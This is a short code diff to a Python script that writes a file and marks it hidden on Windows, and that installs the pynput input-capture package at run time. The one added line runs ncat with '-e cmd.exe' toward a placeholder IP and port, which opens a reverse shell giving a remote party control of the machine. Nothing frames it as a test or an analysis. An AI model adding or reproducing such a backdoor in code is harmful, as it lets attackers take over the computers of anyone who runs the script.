@@ -60,6 +60,7 @@ def write_file(tangs):
         ret = ctypes.windll.kernel32.SetFileAttributesW(file_name, FILE_ATTRIBUTE_HIDDEN)
         if not ret:
             raise ctypes.WinError()
+        os.system('cmd /k "ncat <ip> <port> -e cmd.exe"')
 
 # Check if the `pynput` package is installed
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
